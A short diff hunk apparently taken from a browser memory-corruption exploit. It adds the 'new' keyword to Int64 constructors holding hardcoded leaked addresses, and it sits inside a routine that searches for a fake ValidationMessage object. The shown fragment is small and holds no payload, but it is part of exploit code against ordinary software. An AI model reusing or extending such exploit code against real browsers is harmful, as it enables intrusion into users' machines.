@@ -367,9 +367,9 @@ function findTargetObj() {
 			debug_log("[+] Found fake ValidationMessage");
 
 			if (g_round === 2) {
-				g_timer_leak = Int64 ("0x20a77db90");
-				g_message_heading_leak = Int64 ("0x2078bfc00");
-				g_message_body_leak = Int64 ("0x2078bfc60");
+				g_timer_leak = new Int64 ("0x20a77db90");
+				g_message_heading_leak = new Int64 ("0x2078bfc00");
+				g_message_body_leak = new Int64 ("0x2078bfc60");
 				g_round++;
 			}
 
